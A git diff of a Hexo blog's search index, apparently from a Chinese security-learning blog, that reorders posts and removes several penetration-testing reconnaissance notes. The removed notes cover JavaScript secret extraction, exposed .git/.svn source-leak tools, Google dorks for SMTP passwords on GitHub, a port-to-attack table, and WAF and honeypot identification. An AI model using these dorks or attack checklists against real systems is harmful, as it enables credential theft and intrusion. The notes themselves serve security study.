@@ -1,100 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>404星链项目</title>
-    <url>/2024/03/12/404%E6%98%9F%E9%93%BE%E9%A1%B9%E7%9B%AE/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/knownsec/404StarLink">404StarLink</a><br><br></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>「404星链计划」是知道创宇 404 实验室于 2020 年 8 月开始的计划，主要目的是改善安全圈内工具庞杂、水平层次不齐、开源无人维护的多种问题，促进安全开源社区的发展；通过这种方式将不同安全领域研究人员与开源项目链接起来。</p>
-<p>星链计划将不断地收集优秀的安全开源项目，对收录的项目提供技术支持，持续跟踪和展示项目的更新和动态，并建立了星链计划社区，社区用户可以通过星链展示板块探索自己感兴趣的项目，同时还可以在社区内快速为开源作者反馈问题。以此方式帮助开源项目成长，促进安全社区发展。</p>
-]]></content>
-      <categories>
-        <category>项目</category>
-      </categories>
-      <tags>
-        <tag>项目集合</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Markdown语法</title>
-    <url>/2024/03/11/Markdown%E8%AF%AD%E6%B3%95/</url>
-    <content><![CDATA[<h2 id="Markdown-官方教程"><a href="#Markdown-官方教程" class="headerlink" title="Markdown 官方教程"></a><a href="https://markdown.com.cn/cheat-sheet.html#%E6%80%BB%E8%A7%88">Markdown 官方教程</a></h2><table>
-<thead>
-<tr>
-<th>元素</th>
-<th>Markdown 语法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>标题（Heading）</td>
-<td><code># H1</code><br><code>## H2</code><br><code>### H3</code></td>
-</tr>
-<tr>
-<td>粗体（Bold）</td>
-<td><code>**bold text**</code></td>
-</tr>
-<tr>
-<td>斜体（Italic）</td>
-<td><code>*italicized text*</code></td>
-</tr>
-<tr>
-<td>引用块（Blockquote）</td>
-<td><code>&gt; blockquote</code></td>
-</tr>
-<tr>
-<td>有序列表（Ordered List）</td>
-<td><code>1. First item</code><br><code>2. Second item</code><br><code>3. Third item</code></td>
-</tr>
-<tr>
-<td>无序列表（Unordered List）</td>
-<td><code>- First item</code><br><code>- Second item</code><br><code>- Third item</code></td>
-</tr>
-<tr>
-<td>代码（Code）</td>
-<td><code>`code`</code></td>
-</tr>
-<tr>
-<td>分隔线（Horizontal Rule）</td>
-<td><code>---</code></td>
-</tr>
-<tr>
-<td>链接（Link）</td>
-<td><code>[title](https://www.example.com)</code></td>
-</tr>
-<tr>
-<td>图片（Image）</td>
-<td><code>![alt text](image.jpg)</code></td>
-</tr>
-<tr>
-<td>代码块（Fenced Code Block）</td>
-<td><code>```bash</code><br><code>&#123;</code><br><code>  &quot;firstName&quot;: &quot;John&quot;,</code><br><code>  &quot;lastName&quot;: &quot;Smith&quot;,</code><br><code>  &quot;age&quot;: 25</code><br><code>&#125;</code><br><code>```</code></td>
-</tr>
-<tr>
-<td>脚注（Footnote）</td>
-<td><code>Here&#39;s a sentence with a footnote. [^1]</code><br><code>[^1]: This is the footnote.</code></td>
-</tr>
-<tr>
-<td>标题编号（Heading ID）</td>
-<td><code>### My Great Heading &#123;#custom-id&#125;</code></td>
-</tr>
-<tr>
-<td>定义列表（Definition List）</td>
-<td><code>term</code><br><code>: definition</code></td>
-</tr>
-<tr>
-<td>删除线（Strikethrough）</td>
-<td><code>~~The world is flat.~~</code></td>
-</tr>
-<tr>
-<td>任务列表（Task List）</td>
-<td><code>- [x] Write the press release</code><br><code>- [ ] Update the website</code><br><code>- [ ] Contact the media</code></td>
-</tr>
-</tbody></table>
-]]></content>
-      <tags>
-        <tag>Markdown</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hexo网站搭建和命令</title>
     <url>/2024/03/11/Hexo%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/</url>
     <content><![CDATA[<h2 id="Hexo搭建和命令参考"><a href="#Hexo搭建和命令参考" class="headerlink" title="Hexo搭建和命令参考"></a><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029">Hexo搭建和命令参考</a></h2><!-- 换新电脑参考上面网址 -->
@@ -108,7 +14,7 @@
 <li><p>复制备份的source，scaffolds，_config.yml，_config.flexblock.yml，_config.async.yml到Blog目录下<br>删除Blog目录下_config.landscape.yml和theme\flexblock目录下的_config.yml</p>
 </li>
 <li><p>Blog目录下cmd</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install --save hexo-renderer-less hexo-renderer-ejs</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/miiiku/hexo-theme-flexblock.git ./themes/flexblock</span><br><span class="line">npm i hexo-theme-async@latest</span><br><span class="line">npm install hexo-helper-live2d</span><br><span class="line">npm install live2d-widget-model-hijiki</span><br><span class="line">npm install live2d-widget-model-wanko</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install --save hexo-renderer-less hexo-renderer-ejs</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/miiiku/hexo-theme-flexblock.git ./themes/flexblock</span><br><span class="line">npm i hexo-theme-async@latest</span><br><span class="line">npm install hexo-helper-live2d</span><br><span class="line">npm install live2d-widget-model-hijiki</span><br><span class="line">npm install live2d-widget-model-wanko</span><br><span class="line">npm install hexo-generator-searchdb</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>访问本地：<br>hexo g<br>hexo s<br>访问<a href="http://localhost:4000/">本地 4000端口</a></p>
 </li>
@@ -121,458 +27,18 @@
       </tags>
   </entry>
   <entry>
-    <title>JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目</title>
-    <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B914/</url>
-    <content><![CDATA[<h2 id="什么是JS渗透测试？"><a href="#什么是JS渗透测试？" class="headerlink" title="什么是JS渗透测试？"></a>什么是JS渗透测试？</h2><p>在JavaScript中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞<br>JS开发的Web应用和PHP，Java，NET等区别在于即没有源代码，也可以通过浏览器的查看源代码获取真实的点。获取URL，获取JS敏感信息，获取代码传参等，所以相当于JS开发的WEB应用属于白盒测试（默认有源码参考），一般会在JS中寻找更多的URL地址，在分析JS代码逻辑（加密算法，APIKey配置，验证逻辑等）进行后期安全测试。</p>
-<p>前提：Web应用可以采用前端或后端语言开发<br>后端语言：PHP Java Python .NET 浏览器端看不到真实的源代码<br>前端语言：JavaScript(JS)和JS框架 浏览器端能看到真实的源代码</p>
-<p>例子：<br>Zblog：核心功能采用PHP语言去写的，例如登录密码加密<br>Vue.js：核心功能采用框架语法JS写的，例如登录密码加密，验证码<br><br></p>
-<h2 id="JS安全问题"><a href="#JS安全问题" class="headerlink" title="JS安全问题"></a>JS安全问题</h2><p>源码泄漏<br>未授权访问&#x3D;JS里面分析更多的URL访问确定接口路径，从而进入未授权访问<br>敏感Key泄漏&#x3D;JS文件中可能配置了接口信息（云应用，短信，邮件，数据库等）<br>API接口安全&#x3D;（代码中加密提交，参数传递，更多的URL路径）</p>
-<p>如何从表现中的JS提取价值信息<br>如何从地址中，Fuzz工具来提取未知的JS文件<br>如何从JS开放框架WebPack进行测试<br><br></p>
-<h2 id="流行的JS框架有那些？"><a href="#流行的JS框架有那些？" class="headerlink" title="流行的JS框架有那些？"></a>流行的JS框架有那些？</h2><p>Vue.js, Node.js, jQuery, Angular等<br><br></p>
-<h2 id="如何判定JS开发应用？"><a href="#如何判定JS开发应用？" class="headerlink" title="如何判定JS开发应用？"></a>如何判定JS开发应用？</h2><p>插件Wappalyzer<br>源程序代码简短<br>引入多个JS文件<br>一般有&#x2F;static&#x2F;js&#x2F;app.js等顺序的JS文件<br>一般cookie中有connect.sid<br><br></p>
-<h2 id="如何获取更多的JS文件？"><a href="#如何获取更多的JS文件？" class="headerlink" title="如何获取更多的JS文件？"></a>如何获取更多的JS文件？</h2><p>手工-浏览器搜索<br>半自动-Burpsuite插件<br>工具化-各类提取&amp;Fuzz项目<br><br></p>
-<h2 id="前端架构-手工搜索分析"><a href="#前端架构-手工搜索分析" class="headerlink" title="前端架构-手工搜索分析"></a>前端架构-手工搜索分析</h2><p>打开检查，网站全局搜索分析<br>全局搜索，找连接地址和路径</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">src=</span><br><span class="line">path=</span><br><span class="line">method:<span class="string">&quot;get&quot;</span></span><br><span class="line">http.get(<span class="string">&quot;)</span></span><br><span class="line"><span class="string">method:&quot;</span>post<span class="string">&quot;</span></span><br><span class="line"><span class="string">http.post(&quot;</span>)</span><br><span class="line">.ajax</span><br><span class="line">http://service.httppost</span><br><span class="line">http://service.httpget</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h2 id="前端架构-半自动Burp分析"><a href="#前端架构-半自动Burp分析" class="headerlink" title="前端架构-半自动Burp分析"></a>前端架构-半自动Burp分析</h2><p>插件一：<a href="https://github.com/ScriptKid-Beta/Unexpected_information">Unexpected_information</a><br>用来标记请求包中的一些敏感信息、JS接口和一些特殊字段，<br>防止我们疏忽了一些数据包，使用它可能会有意外的收获信息。</p>
-<p>插件二：<a href="https://github.com/gh0stkey/HaE">HaE</a><br>基于BurpSuite插件JavaAPI开发的请求高亮标记与信息提取的辅助型插件。该插件可以通过自定义正则的方式匹配响应报文或请求报文，可以自行决定符合该自定义正则匹配的相应请求是否需要高亮标记、信息提取。<br><br></p>
-<h2 id="前端架构-自动化项目分析"><a href="#前端架构-自动化项目分析" class="headerlink" title="前端架构-自动化项目分析"></a>前端架构-自动化项目分析</h2><p>1.用的最多，功能最差的：<a href="https://github.com/Threezh1/JSFinder">JSFinder</a>-从表现中JS中提取URL或者敏感数据<br>一款用作快速在网站的JS文件中提取URL，子域名的工具，然后挑选测试，进入，看看能不能未授权访问</p>
-<p>2.Jsfinder的升级版：<a href="https://github.com/pingc0y/URLFinder">URLFinder</a>-从表现中JS中提取URL或者敏感数据<br>一款用于快速提取检测页面中JS与URL的工具。<br>功能类似于JSFinder，但JSFinder好久没更新了。</p>
-<p>3.<a href="https://github.com/p1g3/JSINFO-SCAN">JSINFO-SCAN</a>-从表现中JS中提取URL或者敏感数据<br>递归爬取域名(netloc&#x2F;domain)，以及递归从JS中获取信息的工具</p>
-<p>4.很好用的浏览器插件：<a href="https://github.com/momosecurity/FindSomething">FindSomething</a><br>从表现中JS中提取URL或者敏感数据<br>该工具是用于快速在网页的html源码或JS代码中提取一些有趣的信息的浏览器插件，<br>包括请求的资源、接口的URL，请求的IP和域名，泄漏的证件号、手机号、邮箱等信息。</p>
-<p>5.<a href="https://github.com/ffuf/ffuf">Ffuf</a>-爆破找到更多的JS文件分析更多的信息<br>各种字典：<a href="https://wordlists.assetnote.io/">https://wordlists.assetnote.io</a><br>功能强大的模糊化工具，用它来FUZZ模糊化js文件。</p>
-<p>6.<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a>-针对JS框架开发打包器Webpack检测，在浏览器插件杂项里面有webpack就能使用这个工具了<br>一款针对Webpack等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具，然后就能生成报告</p>
+    <title>404星链项目</title>
+    <url>/2024/03/12/404%E6%98%9F%E9%93%BE%E9%A1%B9%E7%9B%AE/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/knownsec/404StarLink">404StarLink</a><br><br></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>「404星链计划」是知道创宇 404 实验室于 2020 年 8 月开始的计划，主要目的是改善安全圈内工具庞杂、水平层次不齐、开源无人维护的多种问题，促进安全开源社区的发展；通过这种方式将不同安全领域研究人员与开源项目链接起来。</p>
+<p>星链计划将不断地收集优秀的安全开源项目，对收录的项目提供技术支持，持续跟踪和展示项目的更新和动态，并建立了星链计划社区，社区用户可以通过星链展示板块探索自己感兴趣的项目，同时还可以在社区内快速为开源作者反馈问题。以此方式帮助开源项目成长，促进安全社区发展。</p>
 ]]></content>
       <categories>
-        <category>信息打点</category>
+        <category>项目</category>
       </categories>
-  </entry>
-  <entry>
-    <title>Web应用&amp;源码泄漏&amp;开源闭源&amp;指纹识别&amp;GIT&amp;SVN&amp;DS&amp;备份</title>
-    <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B913/</url>
-    <content><![CDATA[<h2 id="后端-开源-指纹识别-源码下载"><a href="#后端-开源-指纹识别-源码下载" class="headerlink" title="后端-开源-指纹识别-源码下载"></a>后端-开源-指纹识别-源码下载</h2><table>
-<thead>
-<tr>
-<th>标签</th>
-<th>名称</th>
-<th>地址</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>优选指纹识别</td>
-<td>TideFinger潮汐</td>
-<td><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></td>
-</tr>
-<tr>
-<td>优选指纹识别</td>
-<td>云悉指纹</td>
-<td><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></td>
-</tr>
-<tr>
-<td>指纹识别</td>
-<td>在线cms指纹识别</td>
-<td><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></td>
-</tr>
-<tr>
-<td>指纹识别</td>
-<td>Wappalyzer</td>
-<td><a href="https://github.com/AliasIO/wappalyzer">https://github.com/AliasIO/wappalyzer</a></td>
-</tr>
-<tr>
-<td>指纹识别</td>
-<td>WhatWeb</td>
-<td><a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></td>
-</tr>
-<tr>
-<td>指纹识别</td>
-<td>数字观星Finger-P</td>
-<td><a href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a></td>
-</tr>
-</tbody></table>
-<br>
-通过指纹识别，CMS识别项目，下载到源码之后，通过访问网站目录验证确定是否符合该源码
-<br>
-<br>
-
-
-<h2 id="后端-闭源-配置不当-源码泄漏"><a href="#后端-闭源-配置不当-源码泄漏" class="headerlink" title="后端-闭源-配置不当-源码泄漏"></a>后端-闭源-配置不当-源码泄漏</h2><p>备份：敏感目录文件扫描，管理员习惯备份源代码备份到网站目录，可以扫到并下载</p>
-<p>CVS：<br><a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
-<p>GIT：<br>如果发布了，没有删除.git文件，就能使用<a href="https://github.com/lijiejie/GitHack">Githack</a>恢复文件到敏感信息</p>
-<p>SVN：<br>和git原理是一致的，没有删除.Svn文件，就能使用<a href="https://github.com/callmefeifei/SvnHack">Svnhack</a>恢复文件获取到敏感信息</p>
-<p>DS_Store：<br>针对Mac电脑，目录结构进行存储，<a href="https://github.com/lijiejie/ds_store_exp">ds_store_exp</a>不能直接得到源码，得到的是目录架构</p>
-<p>Composer.json：<br>开发的自带文件，利用json文件查看调用的信息，针对php的</p>
-<p><a href="https://www.secpulse.com/archives/124398.html">常见的Web源码泄漏漏洞及其利用</a><br><br></p>
-<h2 id="源码泄漏原因："><a href="#源码泄漏原因：" class="headerlink" title="源码泄漏原因："></a>源码泄漏原因：</h2><ol>
-<li>源码本身的特性入口</li>
-<li>管理员不好的习惯入口</li>
-<li>管理员不好的配置入口</li>
-<li>管理员不好的意识入口</li>
-<li>管理员资源信息搜集入口<br></li>
-</ol>
-<h2 id="源码泄漏集合："><a href="#源码泄漏集合：" class="headerlink" title="源码泄漏集合："></a>源码泄漏集合：</h2><p>composer.json<br>git源码泄露<br>svn源码泄露<br>hg源码泄漏<br>网站备份压缩文件<br>WEB-INF&#x2F;web.xml 泄露<br>DS_Store文件泄露<br>SWP文件泄露<br>CVS泄露<br>Bzr泄露<br>GitHub源码泄漏<br><br></p>
-<h2 id="后端-方向-资源Github-源码泄漏"><a href="#后端-方向-资源Github-源码泄漏" class="headerlink" title="后端-方向-资源Github-源码泄漏"></a>后端-方向-资源Github-源码泄漏</h2><p>解决1：识别出大致信息却无下载资源<br>解决2：未识别出信息，使用码云，Github，OSCHINA资源，获取开发作者的源码<br>解决3：其他行业开发使用对口资源站获取，例如互站网</p>
-<p>涉及：<br><a href="https://gitee.com/">Gitee</a><br><a href="https://www.oschina.net/">OSCHINA</a><br><a href="https://github.com/">Github</a><br><br></p>
-<p>黑源码：<br><a href="https://www.huzhan.com/">互站网</a><br><a href="https://28xin.com/">藏宝库</a><br><a href="https://www.lengcat.com/">冷猫资源网</a><br><a href="https://www.xlymz.com/">小鹿源码站</a><br><a href="https://www.ymadx.com/">源码当先</a><br><br></p>
-<table>
-<thead>
-<tr>
-<th>Github 查询类型</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>仓库标题搜索含有关键字</td>
-<td><code>in:name test</code></td>
-</tr>
-<tr>
-<td>仓库描述搜索含有关键字</td>
-<td><code>in:description test</code></td>
-</tr>
-<tr>
-<td>Readme文件搜索含有关键字</td>
-<td><code>in:readme test</code></td>
-</tr>
-<tr>
-<td>stars数量大于3000的搜索关键字</td>
-<td><code>stars:&gt;3000 test</code></td>
-</tr>
-<tr>
-<td>stars数量在1000到3000的搜索关键字</td>
-<td><code>stars:1000..3000 test</code></td>
-</tr>
-<tr>
-<td>forks数量大于1000的搜索关键字</td>
-<td><code>forks:&gt;1000 test</code></td>
-</tr>
-<tr>
-<td>forks数量在1000到3000的搜索关键字</td>
-<td><code>forks:1000..3000 test</code></td>
-</tr>
-<tr>
-<td>仓库大小大于5000k的搜索关键字</td>
-<td><code>size:&gt;=5000 test</code></td>
-</tr>
-<tr>
-<td>发布时间大于2019-02-12的搜索关键字</td>
-<td><code>pushed:&gt;2019-02-12 test</code></td>
-</tr>
-<tr>
-<td>创建时间大于2019-02-12的搜索关键字</td>
-<td><code>created:&gt;2019-02-12 test</code></td>
-</tr>
-<tr>
-<td>用户名搜索</td>
-<td><code>user:test</code></td>
-</tr>
-<tr>
-<td>指定LICENSE搜索关键字</td>
-<td><code>license:apache-2.0 test</code></td>
-</tr>
-<tr>
-<td>在特定语言的代码中搜索关键字</td>
-<td><code>language:java test</code></td>
-</tr>
-<tr>
-<td>组合搜索</td>
-<td><code>user:test in:name test</code></td>
-</tr>
-</tbody></table>
-<br>
-
-<p>关键字配合谷歌搜索：<br>site:Github.com smtp<br>site:Github.com smtp @qq.com<br>site:Github.com smtp @126.com<br>site:Github.com smtp @163.com<br>site:Github.com smtp @sina.com.cn<br>site:Github.com smtp password<br>site:Github.com String password smtp</p>
-]]></content>
-      <categories>
-        <category>信息打点</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>主机架构&amp;蜜罐识别&amp;WAF识别&amp;端口扫描&amp;协议识别&amp;服务安全</title>
-    <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B915/</url>
-    <content><![CDATA[<h2 id="端口判断服务"><a href="#端口判断服务" class="headerlink" title="端口判断服务"></a>端口判断服务</h2><table>
-<thead>
-<tr>
-<th>端口</th>
-<th>服务</th>
-<th>渗透用途</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>tcp 20,21</td>
-<td>FTP</td>
-<td>允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)</td>
-</tr>
-<tr>
-<td>tcp 22</td>
-<td>SSH</td>
-<td>可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输等等</td>
-</tr>
-<tr>
-<td>tcp 23</td>
-<td>Telnet</td>
-<td>爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令</td>
-</tr>
-<tr>
-<td>tcp 25</td>
-<td>SMTP</td>
-<td>邮件伪造,vrfy&#x2F;expn查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td>
-</tr>
-<tr>
-<td>tcp&#x2F;udp 53</td>
-<td>DNS</td>
-<td>允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控</td>
-</tr>
-<tr>
-<td>tcp&#x2F;udp 69</td>
-<td>TFTP</td>
-<td>尝试下载目标及其的各类重要配置文件</td>
-</tr>
-<tr>
-<td>tcp 80-89,443,8440-8450,8080-8089</td>
-<td>各种常用的Web服务端口</td>
-<td>可尝试经典的topn,vpn,owa,webmail,目标oa,各类Java控制台,各类服务器Web管理面板,各类Web中间件漏洞利用,各类Web框架漏洞利用等等……</td>
-</tr>
-<tr>
-<td>tcp 110</td>
-<td>POP3</td>
-<td>可尝试爆破,嗅探</td>
-</tr>
-<tr>
-<td>tcp 111,2049</td>
-<td>NFS</td>
-<td>权限配置不当</td>
-</tr>
-<tr>
-<td>tcp 137,139,445</td>
-<td>Samba</td>
-<td>可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……</td>
-</tr>
-<tr>
-<td>tcp 143</td>
-<td>IMAP</td>
-<td>可尝试爆破</td>
-</tr>
-<tr>
-<td>udp 161</td>
-<td>SNMP</td>
-<td>爆破默认团队字符串,搜集目标内网信息</td>
-</tr>
-<tr>
-<td>tcp 389</td>
-<td>LDAP</td>
-<td>ldap注入,允许匿名访问,弱口令</td>
-</tr>
-<tr>
-<td>tcp 512,513,514</td>
-<td>Linux rexec</td>
-<td>可爆破,rlogin登陆</td>
-</tr>
-<tr>
-<td>tcp 873</td>
-<td>Rsync</td>
-<td>匿名访问,文件上传</td>
-</tr>
-<tr>
-<td>tcp 1194</td>
-<td>OpenVPN</td>
-<td>想办法钓VPN账号,进内网</td>
-</tr>
-<tr>
-<td>tcp 1352</td>
-<td>Lotus</td>
-<td>弱口令,信息泄漏,爆破</td>
-</tr>
-<tr>
-<td>tcp 1433</td>
-<td>SQL Server</td>
-<td>注入,提权,sa弱口令,爆破</td>
-</tr>
-<tr>
-<td>tcp 1521</td>
-<td>Oracle</td>
-<td>tns爆破,注入,弹shell…</td>
-</tr>
-<tr>
-<td>tcp 1500</td>
-<td>ISPmanager</td>
-<td>弱口令</td>
-</tr>
-<tr>
-<td>tcp 1723</td>
-<td>PPTP</td>
-<td>爆破,想办法钓VPN账号,进内网</td>
-</tr>
-<tr>
-<td>tcp 2082,2083</td>
-<td>cPanel</td>
-<td>弱口令</td>
-</tr>
-<tr>
-<td>tcp 2181</td>
-<td>ZooKeeper</td>
-<td>未授权访问</td>
-</tr>
-<tr>
-<td>tcp 2601,2604</td>
-<td>Zebra</td>
-<td>默认密码zerbra</td>
-</tr>
-<tr>
-<td>tcp 3128</td>
-<td>Squid</td>
-<td>弱口令</td>
-</tr>
-<tr>
-<td>tcp 3312,3311</td>
-<td>kangle</td>
-<td>弱口令</td>
-</tr>
-<tr>
-<td>tcp 3306</td>
-<td>MySQL</td>
-<td>注入,提权,爆破</td>
-</tr>
-<tr>
-<td>tcp 3389</td>
-<td>Windows rdp</td>
-<td>shift后门,需要03以下的系统,爆破,ms12-020</td>
-</tr>
-<tr>
-<td>tcp 3690</td>
-<td>SVN</td>
-<td>svn泄露,未授权访问</td>
-</tr>
-<tr>
-<td>tcp 4848</td>
-<td>GlassFish</td>
-<td>弱口令</td>
-</tr>
-<tr>
-<td>tcp 5000</td>
-<td>Sybase&#x2F;DB2</td>
-<td>爆破,注入</td>
-</tr>
-<tr>
-<td>tcp 5432</td>
-<td>PostgreSQL</td>
-<td>爆破,注入,弱口令</td>
-</tr>
-<tr>
-<td>tcp 5900,5901,5902</td>
-<td>VNC</td>
-<td>弱口令爆破</td>
-</tr>
-<tr>
-<td>tcp 5984</td>
-<td>CouchDB</td>
-<td>未授权导致的任意指令执行</td>
-</tr>
-<tr>
-<td>tcp 6379</td>
-<td>Redis</td>
-<td>可尝试未授权访问,弱口令爆破</td>
-</tr>
-<tr>
-<td>tcp 7001,7002</td>
-<td>WebLogic</td>
-<td>Java反序列化,弱口令</td>
-</tr>
-<tr>
-<td>tcp 7778</td>
-<td>Kloxo</td>
-<td>主机面板登录</td>
-</tr>
-<tr>
-<td>tcp 8000</td>
-<td>Ajenti</td>
-<td>弱口令</td>
-</tr>
-<tr>
-<td>tcp 8009</td>
-<td>tomcat Ajp</td>
-<td>Tomcat-Ajp协议漏洞</td>
-</tr>
-<tr>
-<td>tcp 8443</td>
-<td>Plesk</td>
-<td>弱口令</td>
-</tr>
-<tr>
-<td>tcp 8069</td>
-<td>Zabbix</td>
-<td>远程执行,SQL注入</td>
-</tr>
-<tr>
-<td>tcp 8080-8089</td>
-<td>Jenkins,JBoss</td>
-<td>反序列化,控制台弱口令</td>
-</tr>
-<tr>
-<td>tcp 9080-9081,9090</td>
-<td>WebSphere</td>
-<td>Java反序列化&#x2F;弱口令</td>
-</tr>
-<tr>
-<td>tcp 9200,9300</td>
-<td>ElasticSearch</td>
-<td>远程执行</td>
-</tr>
-<tr>
-<td>tcp 11211</td>
-<td>Memcached</td>
-<td>未授权访问</td>
-</tr>
-<tr>
-<td>tcp 27017,27018</td>
-<td>MongoDB</td>
-<td>爆破,未授权访问</td>
-</tr>
-<tr>
-<td>tcp 50070,50030</td>
-<td>Hadoop</td>
-<td>默认端口未授权访问</td>
-</tr>
-</tbody></table>
-<br>
-
-<p>开放的端口可以判断安装应用服务器，的是什么数据库等等，应对安全问题<br><br></p>
-<h2 id="Web服务器-请求返回包，应用服务器，其他服务协议-端口扫描技术"><a href="#Web服务器-请求返回包，应用服务器，其他服务协议-端口扫描技术" class="headerlink" title="Web服务器-请求返回包，应用服务器，其他服务协议-端口扫描技术"></a>Web服务器-请求返回包，应用服务器，其他服务协议-端口扫描技术</h2><p>可以用作Web，应用中间件，数据库类，其他服务协议探针</p>
-<ol>
-<li><p>端口扫描工具：<a href="https://nmap.org/download.html">Nmap</a>，<a href="https://github.com/robertdavidgraham/masscan">MASSCAN</a>，网络空间 (<a href="https://quake.360.net/quake/#/index">360</a>，<a href="https://fofa.info/">fofa</a>，<a href="https://hunter.qianxin.com/">奇安信</a>等)<br>使用参考：<br><a href="https://www.cnblogs.com/lzy575566/p/15513726.html">编译MASSCAN</a><br><a href="https://blog.csdn.net/qq_53079406/article/details/125266331">MASSCAN核心使用</a><br><a href="https://blog.csdn.net/qq_53079406/article/details/125263917">Nmap核心使用方法</a></p>
-</li>
-<li><p>端口开放状态：Close Open Filtered<br>close就是关闭了，别想了<br>open就是开了<br>filtered就是被过滤了，有可能开了，有可能关闭了，因为防火墙的原因</p>
-</li>
-<li><p>需要考虑情况：防火墙，内网环境<br>防火墙可能出现情况：防火墙阻止判断，端口明明开放，却无法通讯<br>内网环境可能出现情况：明明Web的80或者8080端口，数据库端口开的，网站也能正常打开，但是你对目标进行端口扫描，发现端口没有开放（排除防火墙问题），因为去扫，扫的是外网，没有用，需要扫其中的内网，没办法解决，只能说会出现这种状况</p>
-<br></li>
-</ol>
-<h2 id="WAF防火墙-看图-项目-指纹"><a href="#WAF防火墙-看图-项目-指纹" class="headerlink" title="WAF防火墙-看图&amp;项目&amp;指纹"></a>WAF防火墙-看图&amp;项目&amp;指纹</h2><p>工具链接: <a href="https://github.com/EnableSecurity/wafw00f">WAFW00F</a>，<a href="https://github.com/stamparm/identYwaf">identYwaf</a></p>
-<ol>
-<li><p>WAF解释：<br>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。大部分的WAF都是绕过不了的，能绕过的都是鸡肋的。看见WAF可以直接跑路了，除非是宝塔，安全狗这些可以试试。</p>
-</li>
-<li><p>WAF分类：<br>云WAF：百度安全宝，阿里云盾，华为云，亚马逊云，长亭雷池等（根据产品等级，对象个数来收费，针对中大型企业，色色公司，技术最先进的，时刻升级，时刻保障）<br>硬件WAF：绿盟、安恒、深信服、知道创宇等公司商业产品（政府，军工单位相关，技术也比较强）<br>软件WAF：宝塔，安全狗、D盾等（小中型公司，没经济实力的个人公司）<br>代码级WAF：自己写的代码过滤规则，防止出现注入等，一般是在代码里面写死的</p>
-</li>
-<li><p>识别看图：<br>拦截页面，identYwaf项目内置</p>
-</li>
-<li><p>识别项目：<br>网络空间识别</p>
-<br></li>
-</ol>
-<h2 id="蜜罐平台-人工-网络空间-项目"><a href="#蜜罐平台-人工-网络空间-项目" class="headerlink" title="蜜罐平台-人工&amp;网络空间&amp;项目"></a>蜜罐平台-人工&amp;网络空间&amp;项目</h2><ol>
-<li><p>蜜罐解释：<br>蜜罐是一种安全威胁的检测技术，其本质在于引诱和欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。攻击方可以通过蜜罐识别技术来发现和规避蜜罐。因此，我们有必要站在红队攻击者的角度钻研蜜罐识别的方式方法。</p>
-</li>
-<li><p>蜜罐分类：<br>根据蜜罐与攻击者之间进行的交互的程度可以将蜜罐分为三类：低交互蜜罐.中交互蜜罐、高交互蜜罐。当然还可以根据蜜罐模拟的目标进行分类，比如：数据库蜜罐、工控蜜罐、物联网蜜罐、Web蜜罐等等。</p>
-</li>
-<li><p>识别原理，技术：<br><a href="https://mp.weixin.qq.com/s/jPz9hBmUypFyQlU27vglUg">https://mp.weixin.qq.com/s/jPz9hBmUypFyQlU27vglUg</a></p>
-</li>
-</ol>
-<p><a href="https://hfish.net/#/">hfish</a> 搭建蜜罐，这个搭建的大部分可以绕过网络空间的判断蜜罐</p>
